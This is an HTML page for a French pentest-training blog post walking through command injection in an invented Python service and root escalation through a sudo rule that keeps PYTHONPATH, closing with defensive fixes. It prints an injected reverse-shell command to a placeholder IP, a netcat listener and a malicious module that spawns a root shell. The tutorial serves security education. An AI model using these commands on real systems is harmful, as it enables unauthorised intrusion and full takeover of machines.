@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Injection de commande et élévation de privilèges via PYTHONPATH – Jonas Sleiman</title>
+<meta name="description" content="Jonas Sleiman explique deux failles classiques du pentest : l'injection de commande dans un service, puis l'élévation de privilèges par détournement de PYTHONPATH avec sudo.">
+<meta name="author" content="Jonas Sleiman">
+<meta name="robots" content="index, follow, max-image-preview:large">
+<link rel="canonical" href="https://yojoxsn.github.io/blog/injection-de-commande-et-pythonpath/">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="Jonas Sleiman">
+<meta property="og:locale" content="fr_FR">
+<meta property="og:title" content="Injection de commande et élévation de privilèges via PYTHONPATH">
+<meta property="og:description" content="Deux failles classiques du pentest expliquées pas à pas par Jonas Sleiman : injection de commande et détournement de PYTHONPATH avec sudo.">
+<meta property="og:url" content="https://yojoxsn.github.io/blog/injection-de-commande-et-pythonpath/">
+<meta property="og:image" content="https://yojoxsn.github.io/assets/img/og-image.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="article:author" content="https://yojoxsn.github.io/">
+<meta property="article:published_time" content="2026-10-18">
+<meta property="article:section" content="Tutoriel">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Injection de commande et élévation de privilèges via PYTHONPATH">
+<meta name="twitter:description" content="Deux failles classiques du pentest expliquées pas à pas par Jonas Sleiman.">
+<meta name="twitter:image" content="https://yojoxsn.github.io/assets/img/og-image.png">
+<meta name="theme-color" content="#171721">
+<link rel="icon" href="/favicon.svg" type="image/svg+xml">
+<link rel="apple-touch-icon" href="/assets/img/apple-touch-icon.png">
+<link rel="preload" href="/assets/fonts/inter-latin.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="stylesheet" href="/assets/css/style.min.css">
+<script>document.documentElement.classList.add('js')</script>
+<script src="/assets/js/main.min.js" defer></script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "BlogPosting",
+      "@id": "https://yojoxsn.github.io/blog/injection-de-commande-et-pythonpath/#article",
+      "headline": "Injection de commande et élévation de privilèges via PYTHONPATH",
+      "description": "Deux failles classiques du pentest expliquées pas à pas par Jonas Sleiman : injection de commande et détournement de PYTHONPATH avec sudo.",
+      "url": "https://yojoxsn.github.io/blog/injection-de-commande-et-pythonpath/",
+      "mainEntityOfPage": "https://yojoxsn.github.io/blog/injection-de-commande-et-pythonpath/",
+      "datePublished": "2026-10-18",
+      "dateModified": "2026-10-18",
+      "inLanguage": "fr-FR",
+      "articleSection": "Tutoriel",
+      "image": "https://yojoxsn.github.io/assets/img/og-image.png",
+      "author": {
+        "@type": "Person",
+        "@id": "https://yojoxsn.github.io/#person",
+        "name": "Jonas Sleiman",
+        "url": "https://yojoxsn.github.io/"
+      },
+      "publisher": { "@id": "https://yojoxsn.github.io/#person" },
+      "isPartOf": { "@id": "https://yojoxsn.github.io/blog/#blog" }
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        { "@type": "ListItem", "position": 1, "name": "Accueil", "item": "https://yojoxsn.github.io/" },
+        { "@type": "ListItem", "position": 2, "name": "Blog", "item": "https://yojoxsn.github.io/blog/" },
+        { "@type": "ListItem", "position": 3, "name": "Injection de commande et élévation de privilèges via PYTHONPATH", "item": "https://yojoxsn.github.io/blog/injection-de-commande-et-pythonpath/" }
+      ]
+    }
+  ]
+}
+</script>
+</head>
+<body>
+<a class="skip" href="#contenu">Aller au contenu</a>
+<div class="glow" aria-hidden="true"></div>
+
+<header class="nav">
+  <nav class="wrap nav-inner" aria-label="Navigation principale">
+    <a href="/" class="brand" aria-label="Jonas Sleiman – accueil">
+      <svg viewBox="0 0 26 26" fill="none" stroke="#ededf3" stroke-width="1.3" aria-hidden="true"><circle cx="13" cy="13" r="3" fill="#ededf3" stroke="none"/><circle cx="13" cy="13" r="7.5" stroke-dasharray="30 8"/><circle cx="13" cy="13" r="12" stroke-dasharray="50 12" opacity=".6"/></svg>
+      <span>Jonas Sleiman</span>
+    </a>
+    <ul class="menu">
+      <li><a href="/">Accueil</a></li>
+      <li><a href="/projets/">Projets</a></li>
+      <li><a href="/blog/" aria-current="page">Blog</a></li>
+    </ul>
+  </nav>
+</header>
+
+<main id="contenu">
+  <article class="wrap">
+    <div class="page-head">
+      <nav class="crumbs" aria-label="Fil d'Ariane"><ol><li><a href="/">Accueil</a></li><li><a href="/blog/">Blog</a></li><li aria-current="page">Injection de commande &amp; PYTHONPATH</li></ol></nav>
+      <h1>Injection de commande et élévation de privilèges via PYTHONPATH</h1>
+      <div class="article-meta">
+        <span>Par <a href="/" rel="author">Jonas Sleiman</a></span>
+        <time datetime="2026-10-18">18 octobre 2026</time>
+        <span class="pill">Tutoriel</span>
+      </div>
+    </div>
+
+    <div class="prose">
+      <p>Pendant mon entraînement, j'ai rencontré un enchaînement de deux failles que l'on retrouve très souvent en test d'intrusion : d'abord une <strong>injection de commande</strong> pour obtenir un premier accès, puis une <strong>élévation de privilèges</strong> qui exploite une mauvaise configuration de <code>sudo</code>. Plutôt que de raconter une machine précise, j'ai recréé la situation avec un exemple inventé, pour expliquer le mécanisme. Tout ce qui suit doit rester cantonné à vos propres machines ou à des plateformes d'entraînement qui l'autorisent.</p>
+
+      <h2>1. L'injection de commande</h2>
+      <p>Une injection de commande se produit quand un programme passe une donnée fournie par l'utilisateur <strong>directement au système</strong>, sans la contrôler. Imaginons un petit service écrit en Python qui enregistre un signalement&nbsp;:</p>
+      <pre><code>import os
+
+def signalement():
+    nom = input("votre nom :\n")
+    os.system("bash -c 'echo %s > /tmp/rapport.txt'" % nom)</code></pre>
+      <p>Le problème est à la dernière ligne. Le texte tapé par l'utilisateur est inséré tel quel dans une commande <code>bash</code>. Tant qu'on écrit un nom normal, tout va bien. Mais le shell interprète certains caractères, en particulier le point-virgule, qui sépare deux commandes.</p>
+      <p>Si, à la place de mon nom, j'écris&nbsp;:</p>
+      <pre><code>jonas; id</code></pre>
+      <p>le programme exécute en réalité deux commandes à la suite&nbsp;: le <code>echo</code> prévu, <strong>puis</strong> la commande <code>id</code> que j'ai glissée. Le service fait donc quelque chose que son auteur n'avait jamais prévu. C'est tout le principe de l'injection&nbsp;: détourner une entrée de texte pour faire exécuter ses propres commandes.</p>
+
+      <h3>Du simple test au reverse shell</h3>
+      <p>Exécuter <code>id</code> prouve la faille, mais pour vraiment prendre la main, on demande à la machine de nous rappeler&nbsp;: c'est un <strong>reverse shell</strong>. Sur ma machine d'attaque, je me mets d'abord à l'écoute&nbsp;:</p>
+      <pre><code>nc -lvnp 4444</code></pre>
+      <p>Puis j'injecte une commande qui ouvre une connexion de la cible vers moi&nbsp;:</p>
+      <pre><code>jonas; bash -i &gt;&amp; /dev/tcp/MON_IP/4444 0&gt;&amp;1</code></pre>
+      <p>La cible se connecte alors à mon écoute et me donne un shell. J'ai mon premier accès, avec les droits de l'utilisateur qui faisait tourner le service, souvent un compte peu privilégié.</p>
+      <p><strong>Un détail vécu&nbsp;:</strong> ce premier shell est «&nbsp;sommaire&nbsp;». Il affichait mes commandes en double et certaines sorties n'apparaissaient pas, à cause de l'absence de vrai terminal. On peut le rendre plus confortable&nbsp;:</p>
+      <pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+      <p>C'est une étape que je retiens&nbsp;: un shell instable n'est pas un échec, il se stabilise.</p>
+
+      <h2>2. L'élévation de privilèges via sudo et PYTHONPATH</h2>
+      <p>Avoir un accès, c'est bien&nbsp;; devenir <code>root</code>, c'est l'objectif. Le premier réflexe est de regarder ce que l'utilisateur a le droit de lancer en tant que root&nbsp;:</p>
+      <pre><code>sudo -l</code></pre>
+      <p>Dans mon exemple, la réponse ressemble à ceci&nbsp;:</p>
+      <pre><code>env_keep+=PYTHONPATH
+(root) NOPASSWD: /usr/bin/python3 /opt/appli/outil.py</code></pre>
+      <p>Deux informations très importantes se cachent là&nbsp;:</p>
+      <ul>
+        <li><strong><code>NOPASSWD</code></strong>&nbsp;: je peux lancer ce script Python en tant que root, sans mot de passe.</li>
+        <li><strong><code>env_keep+=PYTHONPATH</code></strong>&nbsp;: quand je lance cette commande avec sudo, la variable d'environnement <code>PYTHONPATH</code> est <em>conservée</em>. Normalement, sudo nettoie l'environnement pour des raisons de sécurité&nbsp;; ici, une exception a été laissée.</li>
+      </ul>
+
+      <h3>Pourquoi PYTHONPATH est dangereux ici</h3>
+      <p><code>PYTHONPATH</code> indique à Python <strong>où chercher les modules</strong> à importer. Regardons le script autorisé&nbsp;:</p>
+      <pre><code>from outils import verif
+print(verif.comparer("a", "a"))</code></pre>
+      <p>Quand Python lit <code>from outils import ...</code>, il cherche un fichier <code>outils.py</code> dans la liste de ses dossiers. Et cette liste commence par les dossiers de <code>PYTHONPATH</code>. Puisque sudo garde ma variable <code>PYTHONPATH</code>, je peux lui faire chercher le module <strong>dans un dossier que je contrôle</strong>, par exemple <code>/tmp</code>.</p>
+      <p>Je crée donc un faux module <code>outils.py</code> dans <code>/tmp</code>. Au lieu de comparer quoi que ce soit, il exécute mon code au moment de l'import&nbsp;:</p>
+      <pre><code>import os
+os.system("/bin/bash")</code></pre>
+      <p>Puis je lance la commande autorisée en pointant <code>PYTHONPATH</code> vers mon dossier&nbsp;:</p>
+      <pre><code>sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/appli/outil.py</code></pre>
+      <p>Python, lancé <strong>en tant que root</strong>, va chercher <code>outils</code>, trouve mon fichier dans <code>/tmp</code> en premier, et exécute mon <code>os.system("/bin/bash")</code>. Résultat&nbsp;: un shell <code>root</code>. La machine est entièrement compromise.</p>
+
+      <h2>Ce que j'en retiens</h2>
+      <ul>
+        <li>Une <strong>injection de commande</strong> vient presque toujours d'une donnée utilisateur passée au système sans contrôle.</li>
+        <li><code>sudo -l</code> est un des tout premiers réflexes après un accès&nbsp;: il révèle souvent le chemin vers root.</li>
+        <li>Garder une variable comme <code>PYTHONPATH</code> dans <code>env_keep</code> casse la protection de sudo et permet de détourner l'import d'un module.</li>
+        <li>Un shell bancal se stabilise, ce n'est pas un échec.</li>
+      </ul>
+
+      <h2>Comment s'en protéger</h2>
+      <p>Côté défense, les corrections sont nettes&nbsp;:</p>
+      <ul>
+        <li>Ne jamais construire une commande système par concaténation de texte. En Python, utiliser <code>subprocess.run([...])</code> avec une liste d'arguments, qui n'interprète pas les caractères spéciaux du shell.</li>
+        <li>Valider et filtrer toute entrée utilisateur.</li>
+        <li>Limiter au strict minimum les règles <code>sudo</code>, et <strong>ne jamais</strong> ajouter de variable sensible comme <code>PYTHONPATH</code> à <code>env_keep</code>.</li>
+      </ul>
+
+      <p>Comprendre une attaque, c'est aussi savoir la corriger&nbsp;: c'est exactement le travail d'un pentester. C'est mon premier article&nbsp;; d'autres suivront au fil de ma progression.</p>
+    </div>
+
+    <div class="prose" style="margin-top:56px">
+      <p>Article écrit par <a href="/">Jonas Sleiman</a>, en formation pentest à Orléans. Retrouvez <a href="/blog/">tous mes articles</a> et <a href="/projets/">mes projets</a>.</p>
+    </div>
+  </article>
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <a href="/" class="brand">Jonas Sleiman</a>
+      <ul>
+        <li><a href="/">Accueil</a></li>
+        <li><a href="/projets/">Projets</a></li>
+        <li><a href="/blog/">Blog</a></li>
+        <li><a href="https://github.com/YojoxSn" target="_blank" rel="noopener">GitHub</a></li>
+        <li><a href="https://tryhackme.com/p/YojoxSn" target="_blank" rel="noopener">TryHackMe</a></li>
+      </ul>
+    </div>
+    <p class="legal">© 2026 Jonas Sleiman · Cybersécurité &amp; pentest · Orléans, France</p>
+  </div>
+</footer>
+</body>
+</html>
